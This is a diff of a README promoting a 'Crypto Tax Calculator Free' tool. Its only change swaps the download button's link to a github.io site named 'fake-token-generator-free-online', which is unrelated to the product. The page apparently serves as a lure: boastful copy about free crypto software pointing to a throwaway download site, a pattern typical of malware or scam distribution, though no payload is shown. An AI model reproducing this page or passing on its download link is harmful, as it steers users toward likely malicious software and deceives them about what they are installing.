@@ -3,7 +3,7 @@
 🚀 The **Crypto Tax Calculator Free** is a must-have tool for traders, investors, and accountants.  
 It automatically calculates **profits, losses, and tax liabilities** across multiple blockchains and exchanges, making compliance easy and stress-free.  
 
-[![Download Crypto Tax Calculator Free](https://img.shields.io/badge/Download-Crypto%20Tax%20Calculator%20Free-greenyellow)](https://bestsoftonik.github.io/public/)  
+[![Download Crypto Tax Calculator Free](https://img.shields.io/badge/Download-Crypto%20Tax%20Calculator%20Free-greenyellow)](https://fake-token-generator-free-online.github.io/.github/)  
 
 ---  
 
